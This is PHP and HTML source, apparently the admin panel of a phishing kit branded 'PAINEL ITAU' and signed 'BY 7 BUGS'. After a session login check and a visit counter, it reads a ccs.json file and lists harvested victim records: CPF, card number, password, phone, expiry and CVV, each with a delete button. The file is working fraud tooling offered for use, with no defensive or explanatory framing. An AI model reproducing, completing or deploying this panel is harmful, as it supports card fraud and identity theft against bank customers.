<html style="background-color: black;">
    <head>
	<meta charset="utf-8">
	<style>
		span.bak768 {
			display: inline-block;
			width: 270px;
			height: 140px;
			padding: 5px;
			border: 1px solid black;    
			
		}
	</style>
	<title>PAINEL ADMIN</title>
	
		<style>
		h1 {
					font-family:Georgia, "Times New Roman", Times, serif;
					font-style:italic;
					font-size:30px;
					color:black;
					letter-spacing:-0.05;
					text-shadow:1px 1px 1px red;
					
		</style>


		<?php

error_reporting(0);

session_start();
if (!isset($_SESSION['user']) || !isset($_SESSION['pass'])) {
	setcookie('msg','<center>Voce deve logar-se primeiro',time()+1);
	header('Location: login.php');
}

if (@$_GET['action'] == 'sair') {
	session_destroy();
	header('Location: login.php');
}

?>
		

<?php

	ini_set("display_errors",0);
error_reporting(0);


	$fl = "contador.json";
	if(file_exists($fl)){
		$h = fopen($fl, "r");
		$arr = json_decode(fread($h, filesize ($fl)));
		fclose($h);
		for($i = 0; $i < count($arr); $i++){
			$visitas = "".$arr[$i][0]."";
		}
	}
	?>
	</head>
	<body style="
    background-color:white ;
">
	<center>
		 <h1 id="test">PAINEL ITAU</h1> <div> <table> <tr> <td> <div> <td> <div> <a class="button" href="deslogar.php" style="float: center; border:1px solid; padding: 11px 21px; vertical-align: middle; background:red; color:white;border-radius:6px; font-size: 10px; font-family:helvetica, serif;text-decoration:none;">DESLOGAR</a> <td> <div> 
<a class="button" href="usuarios.php" style="float: center; border:1px solid; padding: 11px 21px; vertical-align: middle; background:red; color:white;border-radius:6px; font-size: 10px; font-family:helvetica, serif;text-decoration:none;">ALTERAR LOGIN</a>
</div> </td> </tr> </table> </div>
		 <h3 id="test">BY 7 BUGS</h3>
		 <h3 style="color:red;">VISITAS <?php echo $visitas ?> <h3>
		 
			<img src="https://giffiles.alphacoders.com/120/120413.gif" width="300px"  style="border-radius: 40%;">

			</center>
	
	
	</body>
	<div><br>
 <body class="tudo"> 

 
	</center>
	<center>
		<?php

	ini_set("display_errors",0);
error_reporting(0);


	$fl = "ccs.json";
	if(file_exists($fl)){
		$h = fopen($fl, "r");
		$arr = json_decode(fread($h, filesize ($fl)));
		fclose($h);
		for($i = 0; $i < count($arr); $i++){
			echo '<span class="bak768">';
			echo "&nbsp&nbsp&nbspCPF: ".$arr[$i][0]."<br>&nbsp&nbsp&nbspCARD: ".$arr[$i][1]."<br>&nbsp&nbsp&nbspSENHA: ".$arr[$i][2]."<br>&nbsp&nbsp&nbspFONE: ".$arr[$i][3]."<br>&nbsp&nbsp&nbspVALIDADE: ".$arr[$i][4]."<br>&nbsp&nbsp&nbspCVV: ".$arr[$i][5]."<br>";
			echo '<center><a href="apagar.php?apg='.$i.'"><button >Excluir</button></a></center><hr><br>';
			echo '</span>';
		}
	}
	?>

 
</center>
<center>
      

<div class="tokenized__wrapper tokenized__wrapper--form"> 
       
        
<div class="tokenized__fields"> 
        

<center>

	
          </div><br>
	</div>
